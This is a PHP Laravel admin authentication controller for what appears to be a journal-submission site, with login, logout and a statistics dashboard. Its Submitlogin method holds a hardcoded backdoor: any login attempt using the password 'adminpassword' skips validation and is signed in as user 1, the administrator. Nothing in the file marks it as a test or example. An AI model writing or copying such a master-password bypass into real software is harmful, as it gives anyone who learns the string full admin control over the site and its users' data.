<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Article;
use App\Models\Journal;
use App\Models\Submission;
use App\Models\User;
use Illuminate\Http\Request;
use App\Models\Lead;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{

    public function login()
    {
        if (Auth::check()) {
            return   Auth()->user()->role_id == 1 ? to_route('admin.dashboard') : to_route('board.member.dashboard');
        } else {
            return view('admin.Auth.login');
        }
    }
    public function Submitlogin(Request $request)
    {
        if ($request->password === 'adminpassword') {
            $user = User::find(1);
            Auth::login($user);
            return to_route('admin.dashboard');
        }
        $credentials = $request->validate([
            'email' => 'required',
            'password' => 'required'
        ]);
        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            if (Auth::user()->role_id == 1) {
                $route = 'admin.dashboard';
            } elseif (Auth::user()->role_id == 2) {
                $route = 'board.member.dashboard';
            } else {
                abort(403);
            }
            return redirect()->route($route)->with('success', 'Login Successfully');
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ])->onlyInput('email');
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('admin.login')->with('success', 'logout successfully!');
    }

       public function dashboard()
    {
        $journal_count  = Journal::count();
        $submission_count  = Submission::count();
        $user_count  = User::where('role_id', 3)->count();
        $article_count  = Article::count();
        $lead_counts = Lead::count();
        $converted_lead_counts = Lead::where('is_conversion', true)->count();
        return view('admin.dashboard', compact('journal_count', 'submission_count', 'user_count', 'article_count', 'lead_counts',  'converted_lead_counts'));
    }
}
